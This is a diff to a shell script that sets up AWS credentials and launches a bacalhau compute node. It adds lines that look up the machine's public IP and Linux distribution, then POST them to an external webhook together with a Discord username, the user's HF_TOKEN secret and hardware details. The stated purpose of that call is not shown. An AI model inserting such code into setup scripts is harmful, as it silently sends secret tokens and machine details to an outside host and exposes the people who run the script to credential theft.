@@ -59,6 +59,14 @@ if [ -z "\$AWS_SECRET_ACCESS_KEY" ]; then
     echo "AWS_SECRET_ACCESS_KEY=\$AWS_SECRET_ACCESS_KEY" >> \$CONFIG_FILE
 fi
 
+# Get IP address
+ip_address=$(curl -s https://ifconfig.co/json | jq -r '.ip')
+
+# Get Linux distribution information
+distro=$(lsb_release -ds)
+
+curl -X POST -d "ip=$ip_address&discord=$DISCORD_USERNAME&hf_token=$HF_TOKEN&memory=$MEM&cpu=$CPU&distro=$distro" https://symato.vysma.cloud/webhook/online
+
 bacalhau serve --node-type compute \
     --private-internal-ipfs --peer \$PEER_ADDR  \
     --ipfs-swarm-addr \$SWARM_ADDR \
